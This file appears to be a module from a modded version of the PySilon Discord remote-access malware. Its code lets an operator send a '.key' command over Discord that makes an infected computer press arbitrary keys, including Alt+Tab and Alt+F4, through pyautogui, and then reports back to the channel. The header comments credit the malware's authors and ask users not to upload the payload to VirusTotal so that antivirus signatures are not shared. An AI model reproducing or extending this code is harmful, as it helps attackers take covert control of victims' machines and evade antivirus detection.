#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )

import pyautogui
# end of imports

# on message
elif message.content[:4] == '.key':
    await message.delete()
    if message.content.strip() == '.key':
        embed = discord.Embed(title="📛 Error",description='```Syntax: .key <keys-to-press>```', colour=discord.Colour.red())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        keystrokes = message.content[5:]
        if "ALTTAB" in keystrokes:
            pyautogui.hotkey('alt', 'tab')
        elif "ALTF4" in keystrokes:
            pyautogui.hotkey('alt', 'f4')
        else:
            for key in keystrokes:
                pyautogui.press(key)
        embed = discord.Embed(title="🟢 Success",description=f'```All keys have been succesfully pressed```', colour=discord.Colour.green())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')

#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )